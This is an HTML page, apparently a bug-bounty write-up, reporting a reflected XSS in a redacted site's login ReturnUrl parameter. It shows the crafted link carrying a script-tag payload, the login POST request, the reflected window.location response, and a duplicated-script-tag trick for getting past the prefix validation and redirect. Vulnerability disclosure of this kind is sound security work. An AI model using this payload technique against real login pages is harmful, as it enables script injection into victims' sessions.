@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reflected XSS in Login ReturnUrl Parameter - BOUNTY-DEX</title>
+  <link rel="stylesheet" href="writeup.css">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Reflected Cross-Site Scripting (XSS) — Login ReturnUrl</h1>
+      <div class="meta">
+        <p>BOUNTY-DEX Vulnerability Report</p>
+        <p>Type: <strong>Reflected XSS</strong></p>
+      </div>
+      <span class="severity">MEDIUM</span>
+    </header>
+
+      <h2>Summary</h2>
+      <p>
+        The application places a `ReturnUrl` value in the login page URL (GET). When a user submits the login form, that same `ReturnUrl` value is included inside the POST body as the `ReturnUrl` form parameter. The server later reflects this POST value into a JavaScript context in the response (<code>window.location</code>) without proper escaping. Because an attacker can craft a link containing a malicious payload in the URL and trick a victim into visiting it and then logging in, the reflected payload executes in the victim's browser after login. This is therefore a reflected XSS triggered by the login flow.
+      </p>
+
+    <h2>Proof of Concept</h2>
+    
+    <p>First, the victim is sent to the login page using the following malicious link:</p>
+
+      <div class="code-block">
+    <code>
+      https://redacted.redacted.com/XXX/YYY/ZZZ/Login?returnUrl=REDACTED_ENDPOINT'&lt;script&gt;print()&lt;/script&gt;&lt;script&gt;print()&lt;/script&gt;
+    </code>
+    </div>
+    <p>As shown above, the XSS payload is placed inside the <code>returnUrl</code> parameter, prefixed with <code>REDACTED_ENDPOINT</code>. This is required because the application validates that <code>returnUrl</code> starts with that prefix. If it does not, the user is redirected elsewhere and the payload is not triggered.</p>
+    
+    <p>Login request with the payload included:</p>
+    <div class="code-block">
+      <code>
+POST /XXX/YYY/ZZZ/Login HTTP/1.1<br>
+Host: [REDACTED]<br>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<br>
+<br>
+------WebKitFormBoundary...<br>
+Content-Disposition: form-data; name="ReturnUrl"<br>
+<br>
+/XXX/YYY/ZZZ/AAA?response_type=code&client_id=[REDACTED]&...&returnUrl=REDACTED_ENDPOINT'&lt;script&gt;print()&lt;/script&gt;&lt;script&gt;print()&lt;/script&gt;<br>
+------WebKitFormBoundary...<br>
+Content-Disposition: form-data; name="Username"<br>
+<br>
+victim@example.com<br>
+------WebKitFormBoundary...
+      </code>
+    </div>
+
+    <p>The server response shows that the payload is reflected inside <code>window.location</code> as follow:</p>
+
+    <div class="code-block">
+      <code>
+        &lt;script&gt;<br>
+
+        window.location = 'REDACTED_ENDPOINT';<br>&lt;script&gt;print()&lt;/script&gt;&lt;script&gt;print()&lt;/script&gt;'<br>
+
+        &lt;/script&gt;
+      </code>
+    </div>
+
+<p>If you're wondering why this payload was used instead of a simple <code>javascript:alert(1)</code>, it's because the application requires <code>REDACTED_ENDPOINT</code> at the beginning of the <code>returnUrl</code> parameter. On the other hand, using <code>';&lt;script&gt;print()&lt;/script&gt;</code> as the payload will not work because the DOM is parsed from top to bottom, causing <code>window.location</code> to execute before the XSS payload is rendered in the DOM. I was able to bypass this by confusing <code>window.location</code> through duplicated <code>&lt;script&gt;</code> tags, preventing it from being triggered while still allowing the payload to execute.</p>
+    <p>As a result, the XSS payload executes in the victim's browser after login.</p>
+
+    <a href="/bountydex" class="back-link">← Back to BOUNTY-DEX</a>
+  </div>
+</body>
+</html>
